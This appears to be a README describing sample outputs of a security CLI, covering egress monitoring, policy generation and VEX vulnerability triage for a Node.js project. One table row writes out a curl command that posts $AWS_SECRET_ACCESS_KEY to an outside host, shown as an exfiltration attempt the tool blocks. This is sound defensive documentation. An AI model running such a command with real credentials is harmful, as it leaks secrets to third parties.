# Sample output

These files are real, unedited output from the `capyshield` CLI. The only change is that absolute output paths in the terminal captures were shortened to file names. Use them to see what each command produces before you run it, or as fixtures for tools that consume the JSON.

| File | Produced by | Shows |
|---|---|---|
| [`watch-terminal.txt`](watch-terminal.txt) | `capyshield watch --report … --emit-policy … -- npm install` | The connection table for a real `npm install` |
| [`watch-report.json`](watch-report.json) | `watch --report` | Machine-readable connection events |
| [`emitted-policy.yaml`](emitted-policy.yaml) | `watch --emit-policy` | An enforce-mode policy allowing exactly the hosts seen, annotated with presets |
| [`guard-terminal.txt`](guard-terminal.txt) | `capyshield guard --tls mitm -- curl -d "k=$AWS_SECRET_ACCESS_KEY" https://httpbin.org/post` | An exfiltration attempt blocked over HTTPS, the warning, and exit code 2 |
| [`guard-report.json`](guard-report.json) | `guard --report` | The blocked event with its `rule_id` (the secret's value is never recorded) |
| [`vex-terminal.txt`](vex-terminal.txt) | `capyshield vex --fail-on high,critical` | Triage summary, affected findings, and exit code 3 |
| [`openvex.json`](openvex.json) | `vex --output` | OpenVEX v0.2.0 with reachability facts in `status_notes` |
| [`vex-summary.md`](vex-summary.md) | `vex --summary` | The Markdown table, e.g. for `$GITHUB_STEP_SUMMARY` |
| [`sync-dry-run-payload.json`](sync-dry-run-payload.json) | `vex --redact-paths --dry-run` | Exactly what `--sync` would send: ids, purls and facts, with file paths and the project name hashed |

## How they were produced

**Egress samples.** A throwaway project depending on `left-pad`, with a fresh npm cache so real registry traffic is visible. The AWS key is AWS's documented fake `wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY`.

**VEX samples.** A small Node.js project scanned with `trivy fs --format json` (Trivy 0.76.0, 22 findings). Its layout matters for the results:

```text
package.json         dependencies: lodash 4.17.20, express 4.17.1, node-fetch 2.6.0
                     devDependencies: mocha, minimist
package-lock.json
src/index.js         require('lodash'), require('express')
test/app.test.js     require('node-fetch'), require('minimist')
```

That's why the triage comes out as it does:

| Package | Result | Reason |
|---|---|---|
| `lodash`, `express` | `affected`, with an upgrade `action_statement` | Imported by production code (`src/index.js`) |
| `node-fetch` | `not_affected` (`vulnerable_code_not_in_execute_path`) | A direct dependency, but only test code imports it |
| `qs`, `body-parser`, `path-to-regexp`, … | `under_investigation` | Transitive dependencies of `express`, not imported directly |
| dev dependencies | not in the report | Trivy skips dev dependencies by default |

`SOURCE_DATE_EPOCH` was set so the OpenVEX `timestamp` and `@id` are reproducible. Feeding `openvex.json` back into the scanner suppresses the two `not_affected` findings:

```bash
trivy fs --vex openvex.json .
```
